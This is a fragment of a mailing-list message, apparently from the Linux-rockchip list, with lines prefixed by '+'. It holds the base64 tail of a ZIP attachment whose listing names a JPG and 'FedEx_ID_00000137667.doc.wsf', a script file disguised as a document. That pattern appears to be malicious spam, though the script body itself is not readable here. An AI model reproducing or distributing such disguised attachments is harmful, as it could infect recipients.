+NnrFMXIQr9rm7bJvli+58voa5taBj+aQ8u8BzHA+IY1Q6nWROHAoJKncakUkvxvGoeVZW5ORLEWb
+61IZ/vbJaIH6ofadNfQHC/D7MDHQkf7oywjW6gPXtkwxENKb7I1aFVbvBfY/dw9Tqb/paRmcai4f
+w/Q5xG0lHoyK06wXP2Jdpp0B8MEBbp1h/om2WEXIAhoFtNPMbtQKEFZUCai8IX8nXaqsGI9aSeAd
+rH6tSdJpvVwJUY/eqpkcc6rzpEYalSUtB0xjuozEizyYzC9Vbp5iKHXui3m5s44CTvEpfdIJ6j3i
+hL0jiuznqWvjdT3mOmEs9BaPUFsJot5QCyGcgVtJY7eoxe6DGl2+ti/RTS8dADx/2Lqc6B0E9eoF
+RgK069AieZmgEh5ZnS3hbz15xF+V6LHP+qMXw/YP3/z0Ysj/DM5/AVBLAQIAABQAAAAIAId7YUna
+SQ5AeQ4AAHQOAAAYAAAAAAAAAAAAIAAAAAAAAAAAcWpnbWxoYm1zdm95dmVub3BheC5qcGdQSwEC
+AAAUAAAACACHe2FJLrIkGfsTAAAMRwAAHAAAAAAAAAAAACAAAACvDgAARmVkRXhfSURfMDAwMDAx
+Mzc2NjcuZG9jLndzZlBLBQYAAAAAAgACAJAAAADkIgAAAAA=
+
+
+--b1_308d57c9c258e3acd57dced51890ee2d
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Linux-rockchip mailing list
+Linux-rockchip-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org
+http://lists.infradead.org/mailman/listinfo/linux-rockchip
+
+--b1_308d57c9c258e3acd57dced51890ee2d--
